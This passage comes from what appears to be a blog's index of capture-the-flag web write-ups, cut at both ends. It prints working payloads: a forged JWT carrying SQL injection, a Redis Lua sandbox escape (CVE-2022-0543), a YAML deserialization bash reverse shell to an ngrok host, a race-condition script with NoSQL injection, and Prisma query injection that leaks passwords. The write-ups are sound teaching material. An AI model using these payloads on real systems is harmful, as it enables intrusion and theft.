JWT_SECRET_KEY  Generate a JWT token with the SQL payload  Sign it  Displays it on the screenfrom requests import Sessionfrom time import time, sleepfrom math import floorimport randomimport stringimport uuidimport jwtURL = \"http://challenges.hackday.fr:58990/\"SESSION = Session()# Login using our credentials (test:test)def login():    t = SESSION.post(URL+\"/login\", data={        \"username\": \"test\",        \"password\": \"test\",        \"submit\": \"true\",    })    if(not SESSION.get(URL+\"/check_auth\").json()[\"logged_in\"]):        exit()# Regenerate the `up` value (= server uptime)# by getting informations from the /healthz endpontdef get_time():    server_uptime = SESSION.get(URL+\"/healthz\").json()[\"uptime\"]    server_uptime = floor(server_uptime)    current_time = floor(time())    return current_time - server_uptimedef sign_jwt(secret_key):    payload = {        \"fresh\": False,            # Not important        \"iat\": int(time()),        # Issue date        \"jti\": str(uuid.uuid4()),  # Unique JWT ID        \"type\": \"access\",          # Not important        \"sub\": \"test\",             # Our username        \"nbf\": int(time())-100,    # JWT is NOT valid BEFORE this date        \"exp\": int(time())+2000,   # JWT expires AFTER this date                 # I use a simple UNION query to get the flag        \"favorite_product\": \"4 UNION SELECT null,null,null,flag,null,null FROM flag;\"     }    # Sign the JWT using the server's secret key    token = jwt.encode(payload, secret_key, algorithm=\"HS256\")    return tokenif __name__ == \"__main__\":    login()    print(\"[+] Logged in\")    print(\"[*] Calculating server uptime date and PID\")    time_start = get_time()    print(f\"\\t{time_start}\")    print(f\"\\t1\\n\")    print(f'[&gt;] time_start=\"{time_start}\" pid=\"1\"')    print(f\"[*] Gathering server's seed\\n\")        # Seeding random with servers parameters     random.seed(time_start + 1)    #                        ^ os.getpid() = 1    # In a realistic scenario, we could also do some damage with the flask secret key    flask_secret_key = \"\".join(random.choice(string.printable) for _ in range(32))    # Generate the jwt_secret key    jwt_secret_key = \"\".join(random.choice(string.printable) for _ in range(32))    jwt = sign_jwt(jwt_secret_key)\t    print(\"[+] Generated JWT key:\")    print(f\"\\t{jwt_secret_key}\")    print(\"[+] Generated JWT token:\")    print(f\"\\t{jwt}\")Let’s run it:We’ve generated a signed JWT !eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkzNDMyOSwianRpIjoiMGZhMGRjNjgtMDU2Mi00YWMyLTg5NzEtZDA1Mzg1NmRmNGFiIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE3Mzc5MzQyMjksImV4cCI6MTczNzkzNjMyOSwiZmF2b3JpdGVfcHJvZHVjdCI6IjQgVU5JT04gU0VMRUNUIG51bGwsIG51bGwsbnVsbCxmbGFnLG51bGwsbnVsbCBGUk9NIGZsYWc7In0._rU1aPd0-okBSdCoamyqW9pntOma_nx7nt4E4onLBEYGetting flagFinally, we can use this cookie to get the flag.To do so: Ctrl + Shift + I, storage. Paste the Generated JWT in here, then go to /favorite_product_info (the SQLi vulnerable endpoint):HACKDAY{Th4t_s_S0m3_g000000000000d_qu4lity!}"
  },
  
  {
    "title": "KnightCTF - Luana",
    "url": "/posts/knightctf-2025-luana/",
    "categories": "Writeups, CTFTime2025, KnightCTF",
    "tags": "writeups, web, redis, sandbox-escape, CVE-2022-0543",
    "date": "2025-01-20 16:00:00 +0000",
    





    
    "snippet": "  Enumeration          Index page      Redis        Exploitation          Getting RCE      Getting flag      EnumerationIndex pageLet’s start by accessing the index page:InterestingRedisUsually the...",
    "content": "  Enumeration          Index page      Redis        Exploitation          Getting RCE      Getting flag      EnumerationIndex pageLet’s start by accessing the index page:InterestingRedisUsually the port 6379 is used for redis. Let’s confirm that the port is executing redis using nmap, then try to connect to the remote server using the redis-cli.We are connected to a Redis server, version 5.0.7Fortunatelly, the Redis server doesn’t require authentication! Let’s attempt to get RCE.ExploitationGetting RCEThe classic technique to get an RCE with redis is to write a PHP payload into a file, then execute the PHP script with the web-server. Unfortunatelly the server is using python, not PHP …After some google search for CVEs affecting this redis version, I found this:Apparently we can get RCE by launching the redis internal Lua sandbox, then escaping it, using this payload:eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0Let’s confirm that we have code execution:We’ve successfully executed the id commandGetting flagUsing the same exploit we can ls and cat the flag:KCTF{c0n6r475_b015_n1c3_c47ch}"
  },
  
  {
    "title": "KnightCTF - Baby Injection",
    "url": "/posts/knightctf-2025-baby-injection/",
    "categories": "Writeups, CTFTime2025, KnightCTF",
    "tags": "writeups, web, flask, yaml-injection, unsecure-deserialization, rce",
    "date": "2025-01-20 16:00:00 +0000",
    





    
    "snippet": "  Enumeration          Enumerating website        Exploitation          Getting RCE      Getting flag      EnumerationEnumerating websiteLet’s start by accessing the index page:Website index pageWe...",
    "content": "  Enumeration          Enumerating website        Exploitation          Getting RCE      Getting flag      EnumerationEnumerating websiteLet’s start by accessing the index page:Website index pageWe got redirected to / with a strange base64 payload, let’s decode this:Ok so the server renders YAML probably by decoding the base64, load it, then write it on the page.We can search if there is vulnerabilities in here, I’ll search for keywords like yaml injection python:We got a hit !You can read the article here. For this CTF, we’re only interested in this part:ExploitationGetting RCELet’s adapt this payload to get RCE. I’ll simply replace the time.sleep [params] by os.system [params], and put a bash reverse shell like this:yaml: !!python/object/apply:os.system [\"bash -c 'bash -i &gt;&amp; /dev/tcp/5.tcp.eu.ngrok.io/14824 0&gt;&amp;1'\"]And encode it with base64:eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbSBbImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvNS50Y3AuZXUubmdyb2suaW8vMTQ4MjQgMD4mMSciXQ==Set up a netcat + ngrok listener:Then I try to access http://TARGET_IP/{base64_payload}:Getting FlagKCTF{d38787fb0741bd0efdad8ed01f037740}"
  },
  
  {
    "title": "Srdnlen - Speed",
    "url": "/posts/SrdnlenCTF2025-racecondition/",
    "categories": "Writeups, CTFTime2025, Srdnlen",
    "tags": "writeups, web, express, nosql-injection, json-injection, mongodb, race-condition, python-scripting",
    "date": "2025-01-18 16:00:00 +0000",
    





    
    "snippet": "  Enumeration          Reading source code      Interesting points      Identifying vulnerabilities        Exploitation          Exploiting the vulnerability      Scripting      Getting the flag   ...",
    "content": "  Enumeration          Reading source code      Interesting points      Identifying vulnerabilities        Exploitation          Exploiting the vulnerability      Scripting      Getting the flag      EnumerationReading source code├── docker-compose.yml├── Dockerfile├── init.js├── mongo.js├── package.json├── server│   ├── app.js│   └── routes.js├── models│   ├── discountCodes.js│   ├── product.js│   ├── user.js│   └── userproduct.js└── webviews    ├── error.hbs    ├── home.hbs    ├── layouts    │   └── base.hbs    ├── notfound.hbs    ├── redeemVoucher.hbs    ├── register-user.hbs    ├── store.hbs    ├── success.hbs    └── user-login.hbsWe’re only interested in app.js, route.js and the files in models/, because the logic is located in these files:  app.js  const path = require('path');const bodyParser = require('body-parser');const mongoose = require('mongoose');const express = require('express');const User = require('../models/user');const Product = require('../models/product'); const DiscountCodes = require('../models/discountCodes'); const passport = require('passport');const { engine } = require('express-handlebars');const { Strategy: JwtStrategy } = require('passport-jwt');const cookieParser = require('cookie-parser');function DB(DB_URI, dbName) {    return new Promise((res, _) =&gt; {        mongoose.set('strictQuery', false);        mongoose            .connect(DB_URI, { useNewUrlParser: true, useUnifiedTopology: true, dbName })            .then(() =&gt; res());    });}// Generate a random discount codeconst generateDiscountCode = () =&gt; {    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';    let discountCode = '';    for (let i = 0; i &lt; 12; i++) {        discountCode += characters.charAt(Math.floor(Math.random() * characters.length));    }    return discountCode;};async function App() {    const app = express();    app.use(passport.initialize());    app.use(cookieParser());    app.use(bodyParser.json());    app.engine('hbs', engine({ extname: '.hbs', defaultLayout: 'base' }));    app.use(express.static('static'));    app.set('view engine', 'hbs');    app.set('views', path.join(__dirname, '../webviews'));    app.use('/', require('./routes'));    passport.use('user-local', User.createStrategy());    const option = {        secretOrKey: process.env.JWT_SECRET,        jwtFromRequest: (req) =&gt; req?.cookies?.['jwt'],        algorithms: ['HS256'],    };        passport.use(        new JwtStrategy(option, (payload, next) =&gt; {            User.findOne({ _id: payload.userId })                .then((user) =&gt; {                    next(null, { userId: user._id } || false);                })                .catch((_) =&gt; next(null, false));        })    );    const products = [        { productId: 1, Name: \"Lightning McQueen Toy\", Description: \"Ka-chow! This toy goes as fast as Lightning himself.\", Cost: \"Free\" },        { productId: 2, Name: \"Mater's Tow Hook\", Description: \"Need a tow? Mater's here to save the day (with a little dirt on the side).\", Cost: \"1 Point\" },        { productId: 3, Name: \"Doc Hudson's Racing Tires\", Description: \"They're not just any tires, they're Doc Hudson's tires. Vintage!\", Cost: \"2 Points\" },        {             productId: 4,             Name: \"Lightning McQueen's Secret Text\",             Description: \"Unlock Lightning's secret racing message! Only the fastest get to know the hidden code.\",             Cost: \"50 Points\",             FLAG: process.env.FLAG || 'SRDNLEN{fake_flag}'         }    ];        for (const productData of products) {        const existingProduct = await Product.findOne({ productId: productData.productId });        if (!existingProduct) {            await Product.create(productData);            console.log(`Inserted productId: ${productData.productId}`);        } else {            console.log(`Product with productId: ${productData.productId} already exists.`);        }    }    // Insert randomly generated Discount Codes if they don't exist    const createDiscountCodes = async () =&gt; {        const discountCodes = [            { discountCode: generateDiscountCode(), value: 20 }        ];        for (const code of discountCodes) {            const existingCode = await DiscountCodes.findOne({ discountCode: code.discountCode });            if (!existingCode) {                await DiscountCodes.create(code);                console.log(`Inserted discount code: ${code.discountCode}`);            } else {                console.log(`Discount code ${code.discountCode} already exists.`);            }        }    };    // Call function to insert discount codes    await createDiscountCodes();    app.use('/', (req, res) =&gt; {        res.status(404);        if (req.accepts('html') || req.accepts('json')) {            return res.render('notfound');        }    });    return app;}module.exports = { DB, App };    route.js  const express = require('express')const isAuth = (req, res, next) =&gt; {passport.authenticate('jwt', { session: false, failureRedirect: '/user-login' })(req, res, next)}const JWT = require('jsonwebtoken')const router = express.Router()const passport = require('passport')const UserProducts = require('../models/userproduct'); const Product = require('../models/product'); const User = require('../models/user');const DiscountCodes = require('../models/discountCodes')const { v4: uuidv4 } = require('uuid');let delay = 1.5;router.get('/store', isAuth, async (req, res) =&gt; {    try{        const all = await Product.find()        const products = []        for(let p of all) {            products.push({ productId: p.productId, Name: p.Name, Description: p.Description, Cost: p.Cost })        }        const user = await User.findById(req.user.userId);        return res.render('store', { Authenticated: true, Balance: user.Balance, Product: products})    } catch{        return res.render('error', { Authenticated: true, message: 'Error during request' })    }})router.get('/redeem', isAuth, async (req, res) =&gt; {    try {        const user = await User.findById(req.user.userId);        if (!user) {            return res.render('error', { Authenticated: true, message: 'User not found' });        }        // Now handle the DiscountCode (Gift Card)        let { discountCode } = req.query;                if (!discountCode) {            return res.render('error', { Authenticated: true, message: 'Discount code is required!' });        }        const discount = await DiscountCodes.findOne({discountCode})        if (!discount) {            return res.render('error', { Authenticated: true, message: 'Invalid discount code!' });        }        // Check if the voucher has already been redeemed today        const today = new Date();        const lastRedemption = user.lastVoucherRedemption;        if (lastRedemption) {            const isSameDay = lastRedemption.getFullYear() === today.getFullYear() &amp;&amp;                              lastRedemption.getMonth() === today.getMonth() &amp;&amp;                              lastRedemption.getDate() === today.getDate();            if (isSameDay) {                return res.json({success: false, message: 'You have already redeemed your gift card today!' });            }        }        // Apply the gift card value to the user's balance        const { Balance } = await User.findById(req.user.userId).select('Balance');        user.Balance = Balance + discount.value;        // Introduce a slight delay to ensure proper logging of the transaction         // and prevent potential database write collisions in high-load scenarios.        new Promise(resolve =&gt; setTimeout(resolve, delay * 1000));        user.lastVoucherRedemption = today;        await user.save();        return res.json({            success: true,            message: 'Gift card redeemed successfully! New Balance: ' + user.Balance // Send success message        });    } catch (error) {        console.error('Error during gift card redemption:', error);        return res.render('error', { Authenticated: true, message: 'Error redeeming gift card'});    }});router.get('/redeemVoucher', isAuth, async (req, res) =&gt; {    const user = await User.findById(req.user.userId);    return res.render('redeemVoucher', { Authenticated: true, Balance: user.Balance })});router.get('/register-user', (req, res) =&gt; {    return res.render('register-user')})router.post('/register-user', (req, res, next) =&gt; {    let { username , password } = req.body    if (username == null || password == null){        return next({message: \"Error\"})    }    if(!username || !password) {        return next({ message: 'You forgot to enter your credentials!' })    }    if(password.length &lt;= 2) {        return next({ message: 'Please choose a longer password.. :-(' })    }    User.register(new User({ username }), password, (err, user) =&gt; {        if(err &amp;&amp; err.toString().includes('registered')) {            return next({ message: 'Username taken' })        } else if(err) {            return next({ message: 'Error during registration' })        }        const jwtoken = JWT.sign({userId: user._id}, process.env.JWT_SECRET, {algorithm: 'HS256',expiresIn: '10h'})        res.cookie('jwt', jwtoken, { httpOnly: true })        return res.json({success: true, message: 'Account registered.'})    })})router.get('/user-login', (req, res) =&gt; {    return res.render('user-login')})router.post('/user-login', (req, res, next) =&gt; {    passport.authenticate('user-local', (_, user, err) =&gt; {        if(err) {            return next({ message: 'Error during login' })        }        const jwtoken = JWT.sign({userId: user._id}, process.env.JWT_SECRET, {algorithm: 'HS256',expiresIn: '10h'})        res.cookie('jwt', jwtoken, { httpOnly: true })        return res.json({            success: true,            message: 'Logged'        })    })(req, res, next)})router.get('/user-logout', (req, res) =&gt; {    res.clearCookie('jwt')    res.redirect('/')})function parseCost(cost) {    if (cost.toLowerCase() === \"free\") {        return 0;    }    const match = cost.match(/\\d+/); // Extract numbers from the string    return match ? parseInt(match[0], 10) : NaN; // Return the number or NaN if not found}router.post('/store', isAuth, async (req, res, next) =&gt; {    const productId = req.body.productId;    if (!productId) {        return next({ message: 'productId is required.' });    }    try {        // Find the product by Name        const all = await Product.find()        product = null        for(let p of all) {            if(p.productId === productId){                product = p            }        }        if (!product) {            return next({ message: 'Product not found.' });        }        // Parse the product cost into a numeric value        let productCost = parseCost(product.Cost);          if (isNaN(productCost)) {            return next({ message: 'Invalid product cost format.' });        }        // Fetch the authenticated user        const user = await User.findById(req.user.userId);        if (!user) {            return next({ message: 'User not found.' });        }        // Check if the user can afford the product        if (user.Balance &gt;= productCost) {            // Generate a UUID v4 as a transaction ID            const transactionId = uuidv4();                        // Deduct the product cost and save the user            user.Balance -= productCost;            await user.save();            // Create a new UserProduct entry            const userProduct = new UserProducts({                transactionId: transactionId,                user: user._id,                productId: product._id, // Reference the product purchased            });            await userProduct.save(); // Save the UserProduct entry            // Add the UserProduct reference to the user's ownedproducts array            if (!user.ownedproducts.includes(userProduct._id)) {                user.ownedproducts.push(userProduct._id);                await user.save(); // Save the updated user            }            // Prepare the response data            const responseData = {                success: true,                message: `Product correctly bought! Remaining balance: ${user.Balance}`,                product: {                    Name: product.Name,                    Description: product.Description,                },            };            if (product.productId === 4) {                responseData.product.FLAG = product.FLAG || 'No flag available';            }            return res.json(responseData);        } else {            return res.json({success: false, message: 'Insufficient balance to purchase this product.' });        }    } catch (error) {        console.error('Error during product payment:', error);        return res.json({success: false, message: 'An error occurred during product payment.' });    }});router.get('/', (req, res, next) =&gt; {    passport.authenticate('jwt', async (err, r) =&gt; {        let { userId } = r        if (!userId) {            return res.render('home', {                Authenticated: false            })        }        try {            // Fetch the user and populate the ownedproducts, which are UserProducts            const user = await User.findById(userId)                .populate({                    path: 'ownedproducts', // Populate the UserProducts                    populate: {                        path: 'productId', // Populate the product details                        model: 'Product' // The model to fetch the product details                    }                })                .exec()            // Map the owned products with product details and transactionId            const ownedproducts = user.ownedproducts.map((userProduct) =&gt; {                const product = userProduct.productId; // Access the populated product details                return {                    Name: product.Name,           // Name of the product                    Description: product.Description, // Description of the product                    Cost: product.Cost,             // Cost of the product                    FLAG: product.FLAG || null,      // Flag (only exists for certain products)                    transactionId: userProduct.transactionId // Add transactionId here                }            })            return res.render('home', {                Authenticated: true,                username: user.username,                Balance: user.Balance,  // Pass balance as a variable to the template                ownedproducts: ownedproducts // Pass the products with transactionId            })        } catch (err) {            console.error('Error fetching user or products:', err)            return next(err) // Handle any errors (e.g., database issues)        }    })(req, res, next)})router.use((err, req, res, next) =&gt; {    res.status(err.status || 400).json({        success: false,        error: err.message || 'Invalid Request',    })})module.exports = router  Models  discountCode.js  const mongoose = require('mongoose')const DiscountCodeSchema = new mongoose.Schema({    discountCode: {        type: String,        default: null, // Optional field for discount codes    },    value: {        type: Number,        default: 10    }})module.exports = mongoose.model('DiscountCodes', DiscountCodeSchema)    userproduct.js  const mongoose = require('mongoose')const UserProductsSchema = new mongoose.Schema({    transactionId: {        type: String,        required: true,        unique: true // Ensure the transaction ID is unique    },    user: {        type: mongoose.Schema.Types.ObjectId,        ref: 'User',        required: true    },    productId: {        type: mongoose.Schema.Types.ObjectId,        ref: 'Product',        required: true    },    createdAt: {        type: Date,        default: Date.now // Automatically store when the user buys the product    },    discountCode: {        type: mongoose.Schema.Types.ObjectId,        ref: 'DiscountCodes',        default: null, // Optional field for discount codes    },})module.exports = mongoose.model('UserProducts', UserProductsSchema)    user.js  const mongoose = require('mongoose')const passportLocalMongoose = require('passport-local-mongoose')const userSchema = new mongoose.Schema({    username: {        type: String,        required: true,        unique: true // Ensuring the username is unique    },    passwd: {        type: String    },    Balance: {        type: Number,        default: 0    },    lastVoucherRedemption: {        type: Date,        default: null    },    ownedproducts: [{        type: mongoose.Schema.Types.ObjectId,        ref: 'UserProducts'    }]})userSchema.plugin(passportLocalMongoose, {    session: false})module.exports = mongoose.model('User', userSchema)    product.js  const mongoose = require('mongoose')const productSchema = new mongoose.Schema({    productId: {        type: Number,        required: true,        unique: true    },    Name: {        type: String,        required: true,        unique: true    },    Description: {        type: String,        required: true,        default: ''    },    Cost: {        type: String,        required: true,        default: '15 Points'    },    FLAG: {        type: String    }})module.exports = mongoose.model('Product', productSchema)  Interesting PointsBasically:  The goal is to get 50 credits to purchase the flag in the store.  The only way to earn money is to redeem a gift card  there is only ONE gift card, with a randomly generated ID  The gift card can only be redeemed once per day.That means that we need to find a way to redeem a giftcard with an ID that we don’t have, multiple times. Seems impossible right ?Identifying vulnerabilitiesFortunately there are several vulnerabilities in this code. First there is a NoSQL injection on the /redeem endpoint, which could potentially allow us to redeem the giftcard without knowing its randomly-generated ID:// Now handle the DiscountCode (Gift Card)let { discountCode } = req.query;if (!discountCode) {    return res.render('error', { Authenticated: true, message: 'Discount code is required!' });}const discount = await DiscountCodes.findOne({discountCode})discountCode is a GET parameter taken from the URL and directly passed to the findOne function (from mongoose) without any sanitization. After reading  this and this, I realized I just need to send this json object through the url:{    discountCode: {        $ne: \"a\"    }}MongoDB will look for all discount codes where the ID is not equal to a. We know from the app.js that:const generateDiscountCode = () =&gt; {    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';    let discountCode = '';    for (let i = 0; i &lt; 12; i++) {        discountCode += characters.charAt(Math.floor(Math.random() * characters.length));    }    return discountCode;};The discount code ID doesn’t contain lowercase chars, and is 12 chars long, so it can’t be equal to aYou can learn more on how to send JSON objects through the url here, it’s relatively easy. I’ll use this url:  http://speed.challs.srdnlen.it:8082/redeem?discountCode[$ne]=aWe now have a way to redeem a discount code without knowing its ID !ExploitationExploiting the vulnerabilityIf we try to redeem it one more time:We can’t redeem the discount code a second time!Looking at this code from app.js, we confirm that there is only ONE discount code generated by the application, with a value of 20:const discountCodes = [    { discountCode: generateDiscountCode(), value: 20 }];So we absolutely need to find a way to redeem a token multiple times (at least 3 times to buy the flag).If you look closely at the /redeem route code, you’ll notice another strange thing:const today = new Date();const lastRedemption = user.lastVoucherRedemption;if (lastRedemption) {    const isSameDay = lastRedemption.getFullYear() === today.getFullYear() &amp;&amp;                        lastRedemption.getMonth() === today.getMonth() &amp;&amp;                        lastRedemption.getDate() === today.getDate();    if (isSameDay) {        return res.json({success: false, message: 'You have already redeemed your gift card today!' });    }}// Apply the gift card value to the user's balanceconst { Balance } = await User.findById(req.user.userId).select('Balance');user.Balance = Balance + discount.value;// Introduce a slight delay to ensure proper logging of the transaction // and prevent potential database write collisions in high-load scenarios.new Promise(resolve =&gt; setTimeout(resolve, delay * 1000));user.lastVoucherRedemption = today;await user.save();The backend waits delay * 1000 (= 1,5 * 1000) milliseconds before saving the lastVoucherRedemption date of the current user. So, maybe we could bypass the if (isSameDay) check by spamming the server quickly, so that the backend doesn’t have time to update the lastVoucherRedemption date of the user in the database.ScriptingI wrote a simple python exploit script that uses Threads to send requests in parallel:#!/usr/bin/env python3from threading import Threadfrom sys import argvfrom pwn import logimport requests# Ensure we have the user's JWTif(len(argv) != 2):    log.critical(f\"Usage: {argv[0]} JWT_TOKEN\")# The URL with the NoSQL injectionurl = 'http://speed.challs.srdnlen.it:8082/redeem?discountCode[$ne]=a'# Headers to authenticate with the serverheaders = {    \"Cookie\": f\"jwt={argv[1]}\"}# Redeem the voucher and display the responsedef send_request():\tresponse = requests.get(url, headers=headers)\tif(response.json()[\"success\"] == False):\t\tlog.failure(response.text)\telse:\t\tlog.success(response.text)# Create 20 threadsthreads = [Thread(target=send_request, daemon=True) for _ in range(20)]log.info(\"Targeting \" + url)log.info(\"Sending 20 requests\")# Redeem the voucher 20 times at the same timefor t in threads:    t.start()for t in threads:    t.join()As you may have noticed, the scripts requires a JWT, so that the server can authenticate the user and give him the credits. To get one, go to the register page, register, then Ctrl + Shift + I, then storage:You can grab the JWT from hereThen you can launch the script with the JWT:We succesfully exploited the race conditionThe output is quite weird … but eh … We got our 60 credits, so …Getting th flagTo get the flag, we just have to buy it. To do so go on the store page, and buy the product number 4:No we get back on the home page:And we get the flag !srdnlen{6peed_1s_My_0nly_Competition}"
  },
  
  {
    "title": "UofTCTF - Prismatic Blogs",
    "url": "/posts/uoftctf2025-prismatic/",
    "categories": "Writeups, CTFTime2025, UofTCTF2025",
    "tags": "writeups, web, express, nosql-injection, json-injection, orm-injection, prisma, python-scripting",
    "date": "2025-01-11 16:00:00 +0000",
    





    
    "snippet": "  Enumeration          Reading source code      Interesting points      Identifying vulnerabilities        Exploitation          Exploiting the vulnerability      Scripting (case unsensitive)      ...",
    "content": "  Enumeration          Reading source code      Interesting points      Identifying vulnerabilities        Exploitation          Exploiting the vulnerability      Scripting (case unsensitive)      Scripting (case sensitive)      Getting the flag      EnumerationReading source codeHere is the application source code:  index.js  import express from \"express\";import { PrismaClient } from \"@prisma/client\";const app = express();app.use(express.json())const prisma = new PrismaClient();const PORT = 3000;app.get(  \"/api/posts\",  async (req, res) =&gt; {    try {      let query = req.query;      query.published = true;      let posts = await prisma.post.findMany({where: query});      res.json({success: true, posts})    } catch (error) {      res.json({ success: false, error });    }  });app.post(    \"/api/login\",    async (req, res) =&gt; {        try {            let {name, password} = req.body;            let user = await prisma.user.findUnique({where:{                    name: name                },                include:{                    posts: true                }            });            if (user.password === password) {                 res.json({success: true, posts: user.posts});            }            else {                res.json({success: false});            }        } catch (error) {            res.json({success: false, error});        }    })app.listen(PORT, () =&gt; {    console.log(`Server is running on http://localhost:${PORT}`);});    seed.js  import { PrismaClient } from \"@prisma/client\";const prisma = new PrismaClient();const FLAG = process.env.FLAG || \"uoftctf{FAKEFLAGFAKEFLAG}\"function generateString(length) {    const characters ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';    let result = '';    const charactersLength = characters.length;    for ( let i = 0; i &lt; length; i++ ) {        result += characters.charAt(Math.floor(Math.random() * charactersLength));    }    return result;}const USERS = [    {        name: \"White\",        password: generateString(Math.floor(Math.random()*10)+15),    },    {        name: \"Bob\",        password: generateString(Math.floor(Math.random()*10)+15),    },    {        name: \"Tommy\",        password: generateString(Math.floor(Math.random()*10)+15),    },    {        name: \"Sam\",        password: generateString(Math.floor(Math.random()*10)+15),    },];const NUM_USERS = USERS.length; // all chatGPT generated cause im lazyconst POSTS = [    {    title: `Why Cybersecurity is Everyone's Responsibility`,    body: `In today's digital age, cybersecurity isn't just an IT concern—it's everyone's responsibility. From clicking suspicious links to using weak passwords, small mistakes can lead to big vulnerabilities. Simple habits like enabling two-factor authentication, updating software, and being mindful of phishing emails can protect not just yourself but your entire organization. Cybersecurity starts with awareness—how are you contributing to a safer digital world?`,    authorId: Math.floor(Math.random()*NUM_USERS)+1,    published: true    },    {        title: `Boosting Productivity with Time Blocking`,        body: `Struggling to get things done? Time blocking might be your answer. By dividing your day into focused chunks of work, you can minimize distractions and maximize efficiency. Start by identifying your most important tasks, assign specific time slots, and stick to them. Bonus tip: leave buffer time for unexpected interruptions. Time blocking isn’t just about scheduling—it’s about creating space for what truly matters.`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `3 Easy Tips to Save Energy at Home`,        body: `Reducing your energy footprint doesn’t have to be complicated. Start small:Switch to LED bulbs—they last longer and use less power.Unplug electronics when not in use—they still draw power even when off.Use a programmable thermostat to optimize heating and cooling.These simple changes save money and help the planet—win-win!`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `How to Start Your Fitness Journey Today`,        body: `Getting fit can feel overwhelming, but it doesn’t have to be. Start small: commit to a 10-minute walk daily or try a beginner-friendly workout video. Focus on consistency over intensity. Remember, progress takes time, so celebrate small wins along the way. Your future self will thank you for taking that first step today!`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `The Magic of Morning Routines`,        body: `What do successful people have in common? A solid morning routine. Whether it’s journaling, meditating, or a quick workout, starting your day intentionally sets the tone for productivity and positivity. Don’t overthink it—pick one activity that energizes you and stick with it. Mornings are your power hour; how will you use yours?`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `5 Quick Ways to Declutter Your Space`,        body: `A cluttered space can lead to a cluttered mind. Here’s how to simplify:Apply the “one in, one out” rule for new purchases.Dedicate 10 minutes a day to tidying up.Donate items you haven’t used in a year.Invest in smart storage solutions.Remember: less is more.Decluttering isn’t just about cleaning—it’s about creating a space that inspires calm and focus.`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `Why Soft Skills Are the Secret to Career Growth`,        body: `Technical skills may get your foot in the door, but soft skills will take you further. Communication, adaptability, and emotional intelligence are increasingly valued in today’s workplace. Why? Because they foster collaboration and help you navigate challenges effectively. Want to stand out in your career? Work on your soft skills—they’re just as crucial as hard ones.`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `3 Reasons You Should Start Journaling`,        body: `Feeling overwhelmed? Journaling might be the outlet you need. It helps you:Clarify your thoughts and emotions.Track personal growth and progress.Spark creativity by putting ideas to paper.You don’t need fancy notebooks or hours of time—just a few minutes a day can make a big difference. Start writing and see where it takes you!`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `How to Beat Procrastination for Good`,        body: `Procrastination affects us all, but overcoming it is possible. Start by breaking tasks into smaller, manageable chunks. Use techniques like the Pomodoro timer to stay focused, and reward yourself for completing milestones. Most importantly, don’t aim for perfection—progress is what counts. The best time to start? Right now.`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `The Future of Remote Work`,        body: `The shift to remote work has changed the way we view the workplace. Flexibility and work-life balance are now top priorities for employees, while companies are investing in tools to keep teams connected. But with this freedom comes challenges—like maintaining productivity and avoiding burnout. The future of work is hybrid, but how can we make it truly sustainable for everyone?`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `The Flag`,        body: `This is a secret blog I am still working on. The secret keyword for this blog is ${FLAG}`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: false    }];(async () =&gt; {    await prisma.user.createMany({data: USERS});    await prisma.post.createMany({data: POSTS});})();    schema.prisma  datasource db {  provider = \"sqlite\"  url      = \"file:./database.db\"}generator client {  provider = \"prisma-client-js\"}model User {  id        Int      @id @default(autoincrement())  createdAt DateTime @default(now())  name      String   @unique  password  String  posts     Post[]}model Post {  id        Int      @id @default(autoincrement())  createdAt DateTime @default(now())  updatedAt DateTime @updatedAt  published Boolean  @default(false)  title     String     body      String  author    User    @relation(fields: [authorId], references: [id])  authorId  Int}  Interesting PointsAfter reading the source I noticed some interesting things:  Seed.js:          There are 4 users (White, Bob, Tommy and Sam) with random generated passwords      We have the set of character used to make their passwords      Flag is a private post of random(White, Bob, Tommy, Sam)        Index.js:          Our query is directly passed to Prisma without sanitization in /api/posts      Only 2 routes (/api/posts and /api/login)      You can see all posts (EXCEPT unpublished ones) in /api/posts      You can see all posts (EVEN unpublished ones) written by the author after login in /api/login      So we can either:  Try to “hack” the SQL query to display unpublished posts  Try to “hack” the accounts to login and see their postsIdentifying vulnerabilitiesI started by looking at the /api/posts code to look for vulnerabilities in the SQL query. This part is interesting:let query = req.query;query.published = true;let posts = await prisma.post.findMany({where: query});res.json({success: true, posts})Our query is taken, then the published parameter is passed to true, so in the SQL query a WHERE published = true will be added. I tried googling around, but it seems that we can’t bypass that to display the flag …BUT there’s still a problem ! The user query is directly passed to prisma without any sanitization. It means that we can send JSON through the URL to trick the ORM ! After reading the prisma doc I made this url:  http://TARGET_URL/api/posts?author[name]=BobThe query string will be translated to this JSON:{    author: {        name: \"Bob\"    }}So JavaScript will execute this ORM request:let posts = await prisma.post.findMany({ where: {    author: {        name: \"Bob\"    },    published: true}});We basically have control over the where condition, we can put whatever we want in it !We can show posts associated to Bob for example !ExploitationExploiting the vulnerabilityOk but what next ?Reading the Prisma doc I found a lot of interesting operators that we could use. We know (from the Schema.prisma) that each post is associated with a user (the author), and that this user have a password. We could simply try to exfiltrate this password from the posts table by taking the author, then grabbing it’s password. Let’s use the startsWith operator for example:  http://TARGET_URL/api/posts?author[name]=Bob&amp;author[password][startsWith]=aThat’ll be translated to:{    author: {        name: \"Bob\",        password: {            startsWith: \"a\"        